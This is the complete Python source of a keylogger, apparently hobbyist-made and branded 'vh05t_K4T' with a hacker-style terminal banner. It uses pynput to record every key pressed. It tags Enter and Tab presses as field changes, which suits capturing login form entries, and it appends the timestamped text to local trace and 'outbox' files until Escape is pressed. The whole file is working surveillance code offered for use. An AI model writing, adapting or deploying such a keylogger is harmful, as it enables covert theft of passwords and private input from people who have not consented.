# ============================================================
#   V1rtu3-h05t : v_kat (Virtue Keystroke Access Terminal)
# ============================================================

from pynput.keyboard import Listener, Key
import time, threading

# === Banner splash ===

GREEN = "\033[92m"   # Bright Green
BLUE = "\033[94m"    # Bright Blue
RESET = "\033[0m"    # Reset to default

# Banner frame in green
print(GREEN + r"""
╔═══════════════════════════════════════╗
║                                       ║
║        vh05t_K4T v1.0                 ║
║   Virtue Keystroke Access Terminal    ║
║                                       ║
╚═══════════════════════════════════════╝
""" + RESET)

# Status line in blue
print(BLUE + "   [+] vh05t_K4T engaged..." + RESET)


# themed log files
v1rtu3_trace_file = 'v1rtu3_trace.txt'
v1rtu3_outbox_file = 'v_kat_outbox.txt'

# buffer state
v_kat_buffer = ""
v1rtu3_last_flush = time.time()

def v1rtu3_log(entry, newline_before=False):
    timestamped = f"{time.strftime('%H:%M:%S')} - {entry}"
    with open(v1rtu3_trace_file, 'a') as f:
        if newline_before:
            f.write("\n")
        f.write(timestamped + '\n')
    with open(v1rtu3_outbox_file, 'a') as f:
        if newline_before:
            f.write("\n")
        f.write(timestamped + '\n')
    print(timestamped)


def v1rtu3_flush(force=False):
    global v_kat_buffer, v1rtu3_last_flush
    if v_kat_buffer.strip():
        v1rtu3_log(v_kat_buffer.strip())
        v_kat_buffer = ""
    v1rtu3_last_flush = time.time()

def v_kat_capture(key):
    global v_kat_buffer, v1rtu3_last_flush

    # reset idle timer on every key press
    v1rtu3_last_flush = time.time()

    if hasattr(key, 'char') and key.char is not None:
        v_kat_buffer += key.char
        return

    if key == Key.space:
        v_kat_buffer += " "
    elif key == Key.enter:
        v1rtu3_flush()
        v1rtu3_log("[ENTER]", newline_before=True)
    elif key == Key.tab:
        v1rtu3_flush()
        v1rtu3_log("[Field Change]", newline_before=True)
    elif key == Key.backspace:
        if v_kat_buffer:
            v_kat_buffer = v_kat_buffer[:-1]
    elif key == Key.esc:
        v1rtu3_flush(force=True)
        print("\n[+] vh05t_K4T terminated by ESC key.")
        return False


def v1rtu3_auto_flush():
    """Flush leftover word if idle for > 3 seconds."""
    global v1rtu3_last_flush
    while True:
        time.sleep(1)
        if v_kat_buffer and (time.time() - v1rtu3_last_flush > 3):
            v1rtu3_flush()

# start background auto-flusher
threading.Thread(target=v1rtu3_auto_flush, daemon=True).start()

try:
    with Listener(on_press=v_kat_capture) as v_kat_listener:
        v_kat_listener.join()
except KeyboardInterrupt:
    v1rtu3_flush(force=True)
    print("\n[+] vh05t_K4T terminated by operator.")
